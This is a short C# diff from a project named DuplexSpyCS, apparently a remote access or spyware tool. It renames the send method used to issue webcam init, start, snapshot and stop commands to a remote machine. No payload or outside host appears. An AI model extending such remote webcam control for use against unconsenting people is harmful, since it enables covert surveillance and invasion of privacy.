@@ -176,19 +176,19 @@ namespace DuplexSpyCS
 
         void Snapshot()
         {
-            v.encSend(2, 0, "webcam|snapshot|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
+            v.fnSendCommand("webcam|snapshot|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
         }
         void Start()
         {
             capture = true;
             fps_last = DateTime.Now;
-            v.encSend(2, 0, "webcam|start|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
+            v.fnSendCommand("webcam|start|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
             timer1.Start();
         }
         void Stop()
         {
             capture = false;
-            v.encSend(2, 0, "webcam|stop");
+            v.fnSendCommand("webcam|stop");
             timer1.Stop();
         }
 
@@ -207,7 +207,7 @@ namespace DuplexSpyCS
 
         void setup()
         {
-            v.encSend(2, 0, "webcam|init");
+            v.fnSendCommand("webcam|init");
 
             toolStripButton4.Checked = true;
             toolStripButton8.Checked = false;
@@ -232,7 +232,7 @@ namespace DuplexSpyCS
         private void toolStripComboBox1_SelectedIndexChanged(object sender, EventArgs e)
         {
             if (capture)
-                v.encSend(2, 0, "webcam|start|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
+                v.fnSendCommand("webcam|start|" + toolStripComboBox1.SelectedIndex.ToString() + "|foo");
         }
 
         private void toolStripButton1_Click(object sender, EventArgs e)
@@ -288,7 +288,7 @@ namespace DuplexSpyCS
                     return;
             }
 
-            v.encSend(2, 0, "webcam|stop");
+            v.fnSendCommand("webcam|stop");
             timer1.Stop();
         }
 
